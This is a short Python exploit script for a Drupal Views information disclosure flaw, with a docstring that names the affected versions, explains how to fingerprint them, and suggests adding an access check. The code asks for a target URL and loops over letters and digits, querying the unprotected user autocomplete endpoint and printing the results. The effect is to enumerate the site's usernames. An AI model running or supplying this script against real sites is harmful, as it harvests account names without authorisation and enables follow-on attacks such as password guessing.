''' 
[Drupal] Information disclosure vulnerability of drupal views

Drupal Views versions, 6.x-2.9, 6.x-2.10 and 6.x-2.11, in Drupal 6 
are vulnerable. 

Check drupal version: URL/CHANGELOG.txt
Check views version: URL/sites/all/modules/views/CHANGELOG.txt

Solution 
A simple solution will be to set a permission for the ajax menu, 
or check if a user with the right permission is logged in or not. 
More precisely, the views module failed to provide access controls 
in the function views_ajax_autocomplete_user(). 
url: http://www.zyxware.com/articles/4482/drupal-information-disclosure-vulnerability-of-drupal-views
'''

import requests

url = raw_input("Introduce URL, ej. http://www.url.com: ")
url2 = url+"/?q=admin/views/ajax/autocomplete/user/"

list = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", 
"k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
"1", "2", "3", "4", "5", "6", "7", "8", "9", ".", ",", "0"]

for letter in list:
	req = requests.get(url2+letter)
	print req.content
